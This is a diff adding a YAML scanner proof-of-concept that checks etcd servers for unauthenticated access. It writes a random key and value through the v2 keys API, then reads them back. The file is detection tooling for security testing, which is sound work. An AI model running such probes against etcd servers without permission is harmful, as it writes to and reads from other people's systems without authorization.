@@ -1,0 +1,43 @@
+id: poc-yaml-etcd-unauth
+info:
+  name: Etcd 未授权访问漏洞
+  severity: high
+  tags:
+  - 访问控制错误
+  finger: Etcd
+  reference: []
+  description: null
+variables:
+  r1: random_str(32)
+  r2: random_str(32)
+  r3: random_str(32)
+transport: http
+requests:
+- method: PUT
+  path: /v2/keys/{{.r1}}?dir=true
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 201
+  output: []
+- method: PUT
+  path: /v2/keys/{{.r1}}/{{.r2}}?prevExist=false
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: value={{.r3}}
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 201
+  output: []
+- method: GET
+  path: /v2/keys/{{.r1}}/{{.r2}}?quorum=false&recursive=false&sorted=false
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, r3)
+  output: []
